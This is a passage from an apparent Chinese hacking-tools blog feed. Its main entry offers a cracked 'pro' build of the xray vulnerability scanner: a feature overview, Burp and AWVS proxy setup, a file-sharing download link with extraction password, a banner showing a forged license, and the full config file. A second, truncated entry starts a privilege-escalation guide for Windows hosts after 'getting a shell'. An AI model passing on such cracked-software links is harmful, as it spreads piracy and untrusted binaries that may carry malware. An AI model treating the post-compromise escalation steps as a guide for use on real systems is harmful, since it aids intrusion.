        <tag>黑客工具</tag>
        <tag>cracked</tag>
        <tag>burp</tag>
      </tags>
  </entry>
  <entry>
    <title>【漏扫工具】xray高级版1.7.1 cracked</title>
    <url>/posts/119.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="xray介绍"><a href="#xray介绍" class="headerlink" title="xray介绍"></a>xray介绍</h2><p>xray 是一款功能强大的安全评估工具，由多名经验丰富的一线安全从业者呕心打造而成，主要特性有:</p>
<ul>
<li><strong>检测速度快</strong>。发包速度快; 漏洞检测算法高效。</li>
<li><strong>支持范围广</strong>。大至 OWASP Top 10 通用漏洞检测，小至各种 CMS 框架 POC，均可以支持。</li>
<li><strong>代码质量高</strong>。编写代码的人员素质高, 通过 Code Review、单元测试、集成测试等多层验证来提高代码可靠性。</li>
<li><strong>高级可定制</strong>。通过配置文件暴露了引擎的各种参数，通过修改配置文件可以极大的客制化功能。</li>
<li><strong>安全无威胁</strong>。xray 定位为一款安全辅助评估工具，而不是攻击工具，内置的所有 payload 和 poc 均为无害化检查。</li>
</ul>
<p>目前支持的漏洞检测类型包括:</p>
<ul>
<li>XSS漏洞检测 (key: xss)</li>
<li>SQL 注入检测 (key: sqldet)</li>
<li>命令/代码注入检测 (key: cmd-injection)</li>
<li>目录枚举 (key: dirscan)</li>
<li>路径穿越检测 (key: path-traversal)</li>
<li>XML 实体注入检测 (key: xxe)</li>
<li>文件上传检测 (key: upload)</li>
<li>弱口令检测 (key: brute-force)</li>
<li>jsonp 检测 (key: jsonp)</li>
<li>ssrf 检测 (key: ssrf)</li>
<li>基线检查 (key: baseline)</li>
<li>任意跳转检测 (key: redirect)</li>
<li>CRLF 注入 (key: crlf-injection)</li>
<li>Struts2 系列漏洞检测 (高级版，key: struts)</li>
<li>Thinkphp系列漏洞检测 (高级版，key: thinkphp)</li>
<li>POC 框架 (key: phantasm)</li>
</ul>
<p>其中 POC 框架默认内置 Github 上贡献的 poc，用户也可以根据需要自行构建 poc 并运行。</p>
<h2 id="设计理念"><a href="#设计理念" class="headerlink" title="设计理念"></a>设计理念</h2><ol>
<li>发最少的包做效果最好的探测。如果一个请求可以确信漏洞存在，那就发一个请求。如果两种漏洞环境可以用同一个 payload 探测出来，那就 不要拆成两个。</li>
<li>允许一定程度上的误报来换取扫描速度的提升漏洞检测工具无法面面俱到，在漏报和误报的选择上必然要选择误报。如果在使用中发现误报比较严重，可以进行反馈。</li>
</ol>
<ul>
<li>尽量不用时间盲注等机制检测漏洞。时间检测受影响因素太多且不可控，而且可能会影响其他插件的运行。因此除非必要（如 sql）请尽量使用与时间无关的 payload。</li>
<li>尽量不使用盲打平台如果一个漏洞能用回显检测就用回显检测，因为盲打平台增加了漏洞检测过程的不确定性和复杂性。</li>
<li>耗时操作谨慎处理全局使用 Context 做管理，不会因为某个请求而导致全局卡死。</li>
</ul>
<h2 id="简易架构"><a href="#简易架构" class="headerlink" title="简易架构"></a>简易架构</h2><p>了解 xray 的整体架构可以更好的理解 cli 和配置文件的设置，方便大家更好的使用。</p>
<p>整体来看，扫描器这类工具大致都是由三部分组成：</p>
<ol>
<li>来源处理</li>
<li>漏洞检测</li>
<li>结果输出</li>
</ol>
<h3 id="来源处理"><a href="#来源处理" class="headerlink" title="来源处理"></a>来源处理</h3><p>这一部分的功能是整个漏洞检测的入口，在 xray 中我们定义了 5 个入口，分别是</p>
<ul>
<li>HTTP 被动代理</li>
<li>简易爬虫</li>
<li>单个 URL</li>
<li>URL列表的文件</li>
<li>单个原始 HTTP 请求文件</li>
</ul>
<h3 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h3><p>这一部分是引擎的核心功能，用于处理前面 来源处理 部分产生的标准化的请求。用户可以针对性的启用插件，配置扫描插件的参数，配置 HTTP 相关参数等。</p>
<h3 id="结果输出"><a href="#结果输出" class="headerlink" title="结果输出"></a>结果输出</h3><p>漏洞扫描和运行时的状态统称为结果输出，xray 定义了如下几种输出方式:</p>
<ul>
<li>Stdout (屏幕输出, 默认开启)</li>
<li>JSON 文件输出</li>
<li>HTML 报告输出</li>
<li>Webhook 输出</li>
</ul>
<p>在使用 xray 的过程中只要谨记这三个部分，所有的命令行用法就看起来很简单了。 接下来就让我们上路吧。</p>
<h2 id="高级使用方法"><a href="#高级使用方法" class="headerlink" title="高级使用方法"></a>高级使用方法</h2><h3 id="使用-Burp-与-xray-进行联动"><a href="#使用-Burp-与-xray-进行联动" class="headerlink" title="使用 Burp 与 xray 进行联动"></a>使用 Burp 与 xray 进行联动</h3><p>在实际测试过程中，除了被动扫描，也时常需要手工测试。这里使用 Burp 的原生功能与 xray 建立起一个多层代理，让流量从 Burp 转发到 xray 中。</p>
<p>首先 xray 建立起 webscan 的监听</p>
<p>进入 Burp 后，打开 <code>User options</code> 标签页，然后找到 <code>Upstream Proxy Servers</code> 设置。</p>
<p>点击 <code>Add</code> 添加上游代理以及作用域，<code>Destination host</code>处可以使用<code>*</code>匹配多个任意字符串，<code>?</code>匹配单一任意字符串，而上游代理的地址则填写 xray 的监听地址。</p>
<p>接下来，在浏览器端使用 Burp 的代理地址</p>
<p>此时，请求已经通过了 Burp</p>
<p>至此，联动成功。</p>
<h3 id="xray-与-awvs-爬虫联动"><a href="#xray-与-awvs-爬虫联动" class="headerlink" title="xray 与 awvs 爬虫联动"></a>xray 与 awvs 爬虫联动</h3><p>awvs 的爬虫很好用，支持表单分析和单页应用的爬取，xray 的扫描能力比较强，速度也更快。awvs 和 xray 搭配使用则是如虎添翼。这里演示的是扫描 awvs 的在线靶站 <a href="http://testphp.vulnweb.com/" target="_blank" rel="noopener">http://testphp.vulnweb.com/</a></p>
<p>首先启动 xray 的被动代理，下面的命令将启动一个监听在所有网卡 1111 端口的 HTTP 代理, 并将扫描结果保存在 <code>awvs.html</code> 内。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;xray webscan --listen 0.0.0.0:1111 --html-output awvs.html</span><br></pre></td></tr></table></figure></div>

<p>以 awvs 12 web 版为例，登入管理页后，点击 <code>Targets</code>, 然后点击 <code>Add Target</code> 添加扫描目标:</p>
<p>然后切换到 <code>HTTP</code> 的部分，填写 xray 的 HTTP 代理。</p>
<p>地址需要根据实际情况填写，需要填写为 awvs 所在机器（容器）内能够访问到 xray 代理的地址。如果 xray 在外网，则填写为外网主机的 IP 地址。端口填写为上面启动时设置的端口号。</p>
<p>其他项可以按需调整或保持默认，然后点击 <code>scan</code> 按钮，按图示选择 <code>Crawl Only</code> 即仅使用爬虫，然后点击 Create Scan 就可以开始扫描了。</p>
<p>在扫描，如果有类似下图的结果说明工作正常，等待扫描完成即可。</p>
<p>扫描完成后可以查看 <code>avws.html</code> 查看漏洞详情。</p>
<p>其他具体用法可自行到官网查看<br><a href="https://docs.xray.cool/#/" target="_blank" rel="noopener">https://docs.xray.cool/#/</a></p>
<h2 id="xray1-7-1-pro破解版下载地址"><a href="#xray1-7-1-pro破解版下载地址" class="headerlink" title="xray1.7.1 pro破解版下载地址"></a>xray1.7.1 pro破解版下载地址</h2><p>云中转网盘:</p>
<p><a href="https://www.yunzhongzhuan.com/#sharefile=msSkEOd6_7756" target="_blank" rel="noopener">yunzhongzhuan.com/#sharefile=msSkEOd6_7756</a><br>解压密码: <a href="http://www.ddosi.org" target="_blank" rel="noopener">www.ddosi.org</a></p>
<h2 id="sha256-MD5校验值"><a href="#sha256-MD5校验值" class="headerlink" title="sha256-MD5校验值:"></a>sha256-MD5校验值:</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">xray_windows_amd64_protected.exe</span><br><span class="line"></span><br><span class="line">sha256:</span><br><span class="line">90d634d43ca3a01b178233ac94329a756b4503268ac2030db426f0e714d1f61f</span><br><span class="line"></span><br><span class="line">MD5:</span><br><span class="line">01c6cb0d9d6103ce63b4812fdd744336</span><br></pre></td></tr></table></figure></div>

<h2 id="命令列表"><a href="#命令列表" class="headerlink" title="命令列表:"></a>命令列表:</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">Z:\www.ddosi.org\Xray 1.7.1&gt;xray_windows_amd64_protected.exe -h</span><br><span class="line"></span><br><span class="line">____  ___.________.    ____.   _____.___.</span><br><span class="line">\   \&#x2F;  &#x2F;\_   __   \  &#x2F;  _  \  \__  |   |</span><br><span class="line"> \     &#x2F;  |    _  _&#x2F; &#x2F;  &#x2F;_\  \  &#x2F;   |   |</span><br><span class="line"> &#x2F;     \  |    |   \&#x2F;    |    \ \____   |</span><br><span class="line">\___&#x2F;\  \ |____|   &#x2F;\____|_   &#x2F; &#x2F; _____&#x2F;</span><br><span class="line">     Cracked By Brian.W AKA BigCHAN</span><br><span class="line">Version: 1.7.1&#x2F;f725e41e&#x2F;COMMUNITY-ADVANCED</span><br><span class="line">Licensed to brianW-AKA-BigCHAN@xs3c.co, license is valid until 2099-09-09 08:00:00</span><br><span class="line"></span><br><span class="line">描述:</span><br><span class="line">   xray - A powerful scanner engine [https:&#x2F;&#x2F;docs.xray.cool]</span><br><span class="line"></span><br><span class="line">用法:</span><br><span class="line">    [global options] command [command options] [参数...]</span><br><span class="line"></span><br><span class="line">命令:</span><br><span class="line">     webscan, ws      运行网站扫描任务</span><br><span class="line">     servicescan, ss  运行服务扫描任务</span><br><span class="line">     subdomain, sd    运行子域任务</span><br><span class="line">     poclint, pl      lint yaml poc</span><br><span class="line">     reverse          运行一个独立的反向服务器</span><br><span class="line">     convert          转换结果从json到HTML或从HTML到json</span><br><span class="line">     genca            GenerateToFile CA证书和密钥</span><br><span class="line">     upgrade          检查新版本和升级自我，如果有任何更新发现</span><br><span class="line">     version          显示版本信息</span><br><span class="line">     help, h          显示命令列表或一个命令的帮助</span><br><span class="line"></span><br><span class="line">全局选项:</span><br><span class="line">   --config FILE      从文件加载配置(默认:&quot;config.yaml&quot;)</span><br><span class="line">   --log-level value  日志级别，选择debug, info, warn, error, fatal</span><br><span class="line">   --help, -h         显示帮助信息</span><br></pre></td></tr></table></figure></div>

<h2 id="config-yaml配置文件"><a href="#config-yaml配置文件" class="headerlink" title="config.yaml配置文件:"></a>config.yaml配置文件:</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">version: 4.0</span><br><span class="line"></span><br><span class="line">parallel: 30                      # 漏洞探测的 worker 数量，可以简单理解为同时有 30 个 POC 在运行</span><br><span class="line"></span><br><span class="line"># 全局 http 发包配置</span><br><span class="line"># 更多解释见 https:&#x2F;&#x2F;docs.xray.cool&#x2F;#&#x2F;configration&#x2F;http</span><br><span class="line">http:</span><br><span class="line">  proxy: &quot;&quot;                             # 漏洞扫描时使用的代理，如: http:&#x2F;&#x2F;127.0.0.1:8080。 如需设置多个代理，请使用 proxy_rule 或自行创建上层代理</span><br><span class="line">  proxy_rule: []                        # 漏洞扫描使用多个代理的配置规则, 具体请参照文档</span><br><span class="line">  dial_timeout: 5                       # 建立 tcp 连接的超时时间</span><br><span class="line">  read_timeout: 10                      # 读取 http 响应的超时时间，不可太小，否则会影响到 sql 时间盲注的判断</span><br><span class="line">  max_conns_per_host: 50                # 同一 host 最大允许的连接数，可以根据目标主机性能适当增大</span><br><span class="line">  enable_http2: false                   # 是否启用 http2, 开启可以提升部分网站的速度，但目前不稳定有崩溃的风险</span><br><span class="line">  fail_retries: 0                       # 请求失败的重试次数，0 则不重试</span><br><span class="line">  max_redirect: 5                       # 单个请求最大允许的跳转数</span><br><span class="line">  max_resp_body_size: 2097152           # 最大允许的响应大小, 默认 2M</span><br><span class="line">  max_qps: 500                          # 每秒最大请求数</span><br><span class="line">  allow_methods:                        # 允许的请求方法</span><br><span class="line">  - HEAD</span><br><span class="line">  - GET</span><br><span class="line">  - POST</span><br><span class="line">  - PUT</span><br><span class="line">  - PATCH</span><br><span class="line">  - DELETE</span><br><span class="line">  - OPTIONS</span><br><span class="line">  - CONNECT</span><br><span class="line">  - TRACE</span><br><span class="line">  - MOVE</span><br><span class="line">  - PROPFIND</span><br><span class="line">  headers:</span><br><span class="line">    User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; rv:78.0) Gecko&#x2F;20100101 Firefox&#x2F;78.0</span><br><span class="line">    # Cookie: key&#x3D;value</span><br><span class="line"></span><br><span class="line"># 漏洞探测的插件配置</span><br><span class="line"># 更多解释见 https:&#x2F;&#x2F;docs.xray.cool&#x2F;#&#x2F;configration&#x2F;plugins</span><br><span class="line">plugins:</span><br><span class="line">  baseline:</span><br><span class="line">    enabled: true</span><br><span class="line">    detect_cors_header_config: true     # 检查 cors 相关配置</span><br><span class="line">    detect_server_error_page: true      # 检查服务器错误信息</span><br><span class="line">    detect_system_path_leak: false      # 检查响应是否包含系统路径泄露</span><br><span class="line">    detect_outdated_ssl_version: false  # 检查 ssl 版本问题</span><br><span class="line">    detect_http_header_config: false    # 检查 http 安全相关 header 是否配置</span><br><span class="line">    detect_cookie_httponly: false       # 检查 set-cookie 时是否设置 http only</span><br><span class="line">    detect_china_id_card_number: false  # 检查响应是否存在身份证号</span><br><span class="line">    detect_china_phone_number: false    # 检查响应是否存在电话号码</span><br><span class="line">    detect_china_bank_card: false       # 检查响应是否存在银行卡号</span><br><span class="line">    detect_private_ip: false            # 检查响应是否包含内网 ip</span><br><span class="line">  brute-force:</span><br><span class="line">    enabled: true</span><br><span class="line">    username_dictionary: &quot;&quot;             # 自定义用户名字典, 为空将使用内置 TOP10, 配置后将与内置字典**合并**</span><br><span class="line">    password_dictionary: &quot;&quot;             # 自定义密码字典，为空将使用内置 TOP100, 配置后将与内置字典**合并**</span><br><span class="line">  cmd-injection:</span><br><span class="line">    enabled: true</span><br><span class="line">  crlf-injection:</span><br><span class="line">    enabled: true</span><br><span class="line">  dirscan:</span><br><span class="line">    enabled: true</span><br><span class="line">    depth: 1                            # 检测深度，定义 http:&#x2F;&#x2F;t.com&#x2F;a&#x2F; 深度为 1, http:&#x2F;&#x2F;t.com&#x2F;a 深度为 0</span><br><span class="line">    dictionary: &quot;&quot;                      # 自定义检测字典, 配置后将与内置字典**合并**</span><br><span class="line">  fastjson:</span><br><span class="line">    enabled: true</span><br><span class="line">  jsonp:</span><br><span class="line">    enabled: true</span><br><span class="line">  path-traversal:</span><br><span class="line">    enabled: true</span><br><span class="line">  phantasm:                             # poc 插件</span><br><span class="line">    enabled: true</span><br><span class="line">    depth: 1</span><br><span class="line">    auto_load_poc: false                # 除内置 poc 外，额外自动加载当前目录以 &quot;poc-&quot; 为文件名前缀的POC文件，等同于在 include_poc 中增加 &quot;.&#x2F;poc-*&quot;</span><br><span class="line">    exclude_poc: []                     # 排除哪些 poc, 支持 glob 语法, 如: &quot;&#x2F;home&#x2F;poc&#x2F;*thinkphp*&quot; 或 &quot;poc-yaml-weblogic*&quot;</span><br><span class="line">    include_poc: []                     # 只使用哪些内置 poc 以及 额外加载哪些本地 poc, 支持 glob 语法, 如：&quot;*weblogic*&quot; 或 &quot;&#x2F;home&#x2F;poc&#x2F;*&quot;</span><br><span class="line">                                        # 也可使用 --poc 仅运行 指定的内置或本地 poc，进行测试。</span><br><span class="line">                                        # 例如，可使用如下命令，仅运行当前目录下的 poc 且 不运行内置 poc 进行测试：</span><br><span class="line">                                        # webscan -poc .&#x2F;poc-* -url http:&#x2F;&#x2F;example.com</span><br><span class="line">  redirect:</span><br><span class="line">    enabled: true</span><br><span class="line">  shiro:</span><br><span class="line">    enabled: true</span><br><span class="line">    cookie_name: rememberMe             # 默认使用哪个 shiro cookie name</span><br><span class="line">    aes_key: []                         # 自定义 shiro key，配置后将与内置 100 key 做合并</span><br><span class="line">  sqldet:</span><br><span class="line">    enabled: true</span><br><span class="line">    boolean_based_detection: true       # 是否检测布尔盲注</span><br><span class="line">    error_based_detection: true         # 是否检测报错注入</span><br><span class="line">    time_based_detection: true          # 是否检测时间盲注</span><br><span class="line">    use_comment_in_payload: false       # 在 payload 中使用 or, 慎用！可能导致删库！</span><br><span class="line">    detect_sqli_in_cookie: true         # 是否检查在 cookie 中的注入</span><br><span class="line">  ssrf:</span><br><span class="line">    enabled: true</span><br><span class="line">  struts:</span><br><span class="line">    enabled: true</span><br><span class="line">  thinkphp:</span><br><span class="line">    enabled: true</span><br><span class="line">    detect_thinkphp_sqli: true          # 检查 thinkphp 特定语法的 sqli 注入漏洞</span><br><span class="line">  upload:</span><br><span class="line">    enabled: true</span><br><span class="line">  xss:</span><br><span class="line">    enabled: true</span><br><span class="line">    detect_xss_in_cookie: true          # 是否探测入口点在 cookie 中的 xss</span><br><span class="line">    ie_feature: false                   # 是否扫描仅能在 ie 下利用的 xss</span><br><span class="line">  xxe:</span><br><span class="line">    enabled: true</span><br><span class="line"></span><br><span class="line"># 反连平台配置，更多解释见 https:&#x2F;&#x2F;docs.xray.cool&#x2F;#&#x2F;configration&#x2F;reverse</span><br><span class="line"># 注意: 默认配置为禁用反连平台，这是无法扫描出依赖反连平台的漏洞，这些漏洞包括 fastjson，ssrf 以及 poc 中依赖反连的情况等</span><br><span class="line">reverse:</span><br><span class="line">  db_file_path: &quot;&quot;                      # 反连平台数据库文件位置, 这是一个 KV 数据库</span><br><span class="line">  token: &quot;&quot;                             # 反连平台认证的 Token, 独立部署时不能为空</span><br><span class="line">  http:</span><br><span class="line">    enabled: false</span><br><span class="line">    listen_ip: 0.0.0.0 </span><br><span class="line">    listen_port: &quot;&quot;</span><br><span class="line">    ip_header: &quot;&quot;                       # 在哪个 http header 中取 ip，为空代表从 REMOTE_ADDR 中取</span><br><span class="line">  dns:</span><br><span class="line">    enabled: false</span><br><span class="line">    listen_ip: 0.0.0.0 </span><br><span class="line">    domain: &quot;&quot;                          # DNS 域名配置</span><br><span class="line">    is_domain_name_server: false        # 是否修改了域名的 ns 为反连平台，如果是，那 nslookup 等就不需要指定 dns 了</span><br><span class="line">    resolve:                            # DNS 静态解析规则</span><br><span class="line">    - type: A                           # A, AAAA, TXT 三种</span><br><span class="line">      record: localhost</span><br><span class="line">      value: 127.0.0.1</span><br><span class="line">      ttl: 60</span><br><span class="line">  client:</span><br><span class="line">    remote_server: false                # 是否是独立的远程 server，如果是要在下面配置好远程的服务端地址</span><br><span class="line">    http_base_url: &quot;&quot;                   # 默认将根据 ListenIP 和 ListenPort 生成，该地址是存在漏洞的目标反连回来的地址, 当反连平台前面有反代、绑定域名、端口映射时需要自行配置</span><br><span class="line">    dns_server_ip: &quot;&quot;                   # 和 http_base_url 类似，实际用来访问 dns 服务器的地址</span><br><span class="line"></span><br><span class="line"># 被动代理配置</span><br><span class="line"># 更多解释见 https:&#x2F;&#x2F;docs.xray.cool&#x2F;#&#x2F;configration&#x2F;mitm</span><br><span class="line">mitm:</span><br><span class="line">  ca_cert: .&#x2F;ca.crt                     # CA 根证书路径</span><br><span class="line">  ca_key: .&#x2F;ca.key                      # CA 私钥路径</span><br><span class="line">  basic_auth:                           # 基础认证的用户名密码</span><br><span class="line">    username: &quot;&quot;</span><br><span class="line">    password: &quot;&quot;</span><br><span class="line">  allow_ip_range: []                    # 允许的 ip，可以是 ip 或者 cidr 字符串</span><br><span class="line">  restriction:                          # 代理能够访问的资源限制, 以下各项为空表示不限制</span><br><span class="line">    hostname_allowed: []                # 允许访问的 Hostname，支持格式如 t.com、*.t.com、1.1.1.1、1.1.1.1&#x2F;24、1.1-4.1.1-8</span><br><span class="line">    hostname_disallowed:                # 不允许访问的 Hostname，支持格式如 t.com、*.t.com、1.1.1.1、1.1.1.1&#x2F;24、1.1-4.1.1-8</span><br><span class="line">    - &#39;*google*&#39;</span><br><span class="line">    - &#39;*github*&#39;</span><br><span class="line">    - &#39;*.gov.cn&#39;</span><br><span class="line">    - &#39;*.edu.cn&#39;</span><br><span class="line">    - &#39;*chaitin*&#39;</span><br><span class="line">    - &#39;*.xray.cool&#39;</span><br><span class="line">    port_allowed: []                    # 允许访问的端口, 支持的格式如: 80、80-85</span><br><span class="line">    port_disallowed: []                 # 不允许访问的端口, 支持的格式如: 80、80-85</span><br><span class="line">    path_allowed: []                    # 允许访问的路径，支持的格式如: test、*test*</span><br><span class="line">    path_disallowed: []                 # 不允许访问的路径, 支持的格式如: test、*test*</span><br><span class="line">    query_key_allowed: []               # 允许访问的 Query Key，支持的格式如: test、*test*</span><br><span class="line">    query_key_disallowed: []            # 不允许访问的 Query Key, 支持的格式如: test、*test*</span><br><span class="line">    fragment_allowed: []                # 允许访问的 Fragment, 支持的格式如: test、*test*</span><br><span class="line">    fragment_disallowed: []             # 不允许访问的 Fragment, 支持的格式如: test、*test*</span><br><span class="line">    post_key_allowed: []                # 允许访问的 Post Body 中的参数, 支持的格式如: test、*test*</span><br><span class="line">    post_key_disallowed: []             # 不允许访问的 Post Body 中的参数, 支持的格式如: test、*test*</span><br><span class="line">  queue:</span><br><span class="line">    max_length: 3000                    # 队列长度限制, 也可以理解为最大允许多少等待扫描的请求, 请根据内存大小自行调整</span><br><span class="line">  proxy_header:</span><br><span class="line">    via: &quot;&quot;                             # 是否为代理自动添加 Via 头</span><br><span class="line">    x_forwarded: false                  # 是否为代理自动添加 X-Forwarded-&#123;For,Host,Proto,Url&#125; 四个 http 头</span><br><span class="line">  upstream_proxy: &quot;&quot;                    # 为 mitm 本身配置独立的代理</span><br><span class="line"></span><br><span class="line"># 基础爬虫配置</span><br><span class="line"># 更多解释见 https:&#x2F;&#x2F;docs.xray.cool&#x2F;#&#x2F;configration&#x2F;basic-crawler</span><br><span class="line">basic-crawler:</span><br><span class="line">  max_depth: 0                          # 最大爬取深度， 0 为无限制</span><br><span class="line">  max_count_of_links: 0                 # 本次爬取收集的最大链接数, 0 为无限制</span><br><span class="line">  allow_visit_parent_path: false        # 是否允许爬取父目录, 如果扫描目标为 t.com&#x2F;a&#x2F;且该项为 false, 那么就不会爬取 t.com&#x2F; 这级的内容</span><br><span class="line">  restriction:                          # 爬虫的允许爬取的资源限制, 为空表示不限制。爬虫会自动添加扫描目标到 Hostname_allowed。</span><br><span class="line">    hostname_allowed: []                # 允许访问的 Hostname，支持格式如 t.com、*.t.com、1.1.1.1、1.1.1.1&#x2F;24、1.1-4.1.1-8</span><br><span class="line">    hostname_disallowed:                # 不允许访问的 Hostname，支持格式如 t.com、*.t.com、1.1.1.1、1.1.1.1&#x2F;24、1.1-4.1.1-8</span><br><span class="line">    - &#39;*google*&#39;</span><br><span class="line">    - &#39;*github*&#39;</span><br><span class="line">    - &#39;*.gov.cn&#39;</span><br><span class="line">    - &#39;*.edu.cn&#39;</span><br><span class="line">    - &#39;*chaitin*&#39;</span><br><span class="line">    - &#39;*.xray.cool&#39;</span><br><span class="line">    port_allowed: []                    # 允许访问的端口, 支持的格式如: 80、80-85</span><br><span class="line">    port_disallowed: []                 # 不允许访问的端口, 支持的格式如: 80、80-85</span><br><span class="line">    path_allowed: []                    # 允许访问的路径，支持的格式如: test、*test*</span><br><span class="line">    path_disallowed: []                 # 不允许访问的路径, 支持的格式如: test、*test*</span><br><span class="line">    query_key_allowed: []               # 允许访问的 Query Key，支持的格式如: test、*test*</span><br><span class="line">    query_key_disallowed: []            # 不允许访问的 Query Key, 支持的格式如: test、*test*</span><br><span class="line">    fragment_allowed: []                # 允许访问的 Fragment, 支持的格式如: test、*test*</span><br><span class="line">    fragment_disallowed: []             # 不允许访问的 Fragment, 支持的格式如: test、*test*</span><br><span class="line">    post_key_allowed: []                # 允许访问的 Post Body 中的参数, 支持的格式如: test、*test*</span><br><span class="line">    post_key_disallowed: []             # 不允许访问的 Post Body 中的参数, 支持的格式如: test、*test*</span><br><span class="line">  basic_auth:                           # 基础认证信息</span><br><span class="line">    username: &quot;&quot;</span><br><span class="line">    password: &quot;&quot;</span><br><span class="line"></span><br><span class="line"># 子域名扫描配置，配置解释见 https:&#x2F;&#x2F;docs.xray.cool&#x2F;#&#x2F;configration&#x2F;subdomain</span><br><span class="line"># 注意：该功能仅限高级版用户使用</span><br><span class="line">subdomain:</span><br><span class="line">  max_parallel: 30                      # 子域名探测的并发度</span><br><span class="line">  allow_recursion: false                # 是否允许递归探测, 开启后，扫描完一级域名后，会自动将一级的每个域名作为新的目标</span><br><span class="line">  max_recursion_depth: 3                # 最大允许的递归深度, 3 表示 3 级子域名 仅当 allow_recursion 开启时才有意义</span><br><span class="line">  web_only: false                       # 结果中仅显示有 web 应用的, 没有 web 应用的将被丢弃</span><br><span class="line">  ip_only: false                        # 结果中仅展示解析出 IP 的，没有解析成功的将被丢弃</span><br><span class="line">  servers:                              # 子域名扫描过程中使用的 DNS Server</span><br><span class="line">  - 8.8.8.8</span><br><span class="line">  - 8.8.4.4</span><br><span class="line">  - 223.5.5.5</span><br><span class="line">  - 223.6.6.6</span><br><span class="line">  - 114.114.114.114</span><br><span class="line">  sources:</span><br><span class="line">    brute:</span><br><span class="line">      enabled: true</span><br><span class="line">      main_dict: &quot;&quot;                     # 一级大字典路径，为空将使用内置的 TOP 30000 字典</span><br><span class="line">      sub_dict: &quot;&quot;                      # 其他级小字典路径，为空将使用内置过的 TOP 100 字典</span><br><span class="line">    httpfinder:</span><br><span class="line">      enabled: true                     # 使用 http 的一些方式来抓取子域名，包括 js, 配置文件，http header 等等</span><br><span class="line">    dnsfinder:</span><br><span class="line">      enabled: true                     # 使用 dns 的一些错误配置来找寻子域名，如区域传送（zone transfer)</span><br><span class="line">    certspotter:                        # 下面的通过 api 获取的了</span><br><span class="line">      enabled: true</span><br><span class="line">    crt:</span><br><span class="line">      enabled: true</span><br><span class="line">    hackertarget:</span><br><span class="line">      enabled: true</span><br><span class="line">    qianxun:</span><br><span class="line">      enabled: true</span><br><span class="line">    rapiddns:</span><br><span class="line">      enabled: true</span><br><span class="line">    sublist3r:</span><br><span class="line">      enabled: true</span><br><span class="line">    threatminer:</span><br><span class="line">      enabled: true</span><br><span class="line">    virusTotal:</span><br><span class="line">      enabled: true</span><br></pre></td></tr></table></figure></div>

<p><a href="https://www.ddosi.org/xray-pro-cracked/" target="_blank" rel="noopener">from</a></p>
]]></content>
      <categories>
        <category>黑客工具</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>黑客工具</tag>
        <tag>cracked</tag>
        <tag>xray</tag>
      </tags>
  </entry>
  <entry>
    <title>【提权】提权扫描工具方法</title>
    <url>/posts/109.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
<ul>
<li>提权扫描工具使用</li>
</ul>
</blockquote>
<h1 id="Windows-Exploit-Suggester"><a href="#Windows-Exploit-Suggester" class="headerlink" title="Windows-Exploit-Suggester"></a>Windows-Exploit-Suggester</h1><blockquote>
<p><a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester" target="_blank" rel="noopener">Windows-Exploit-Suggester</a>这个工具很强，但是依赖更新了，所以有几个坑，我记录一下</p>
</blockquote>
<p><strong>1、安装</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;AonCyberLabs&#x2F;Windows-Exploit-Suggester.git</span><br></pre></td></tr></table></figure></div>

<p><strong>2、安装依赖（有坑）</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">由于最新版的xlrd对xls的处理方式不同了，导致这个脚本有使用会报错，所以我们使用老版本的xlrd，记得是如下命令</span><br><span class="line"></span><br><span class="line">python -m pip install xlrd&#x3D;&#x3D;1.2.0</span><br></pre></td></tr></table></figure></div>

<p><strong>3、升级数据库</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;windows-exploit-suggester.py --update</span><br></pre></td></tr></table></figure></div>

<p><strong>4、基本使用方法</strong></p>
<p>比如你拿了个shell，对方是windows，用systemInfo查看一下补丁，然后复制全部信息保存为1.txt</p>
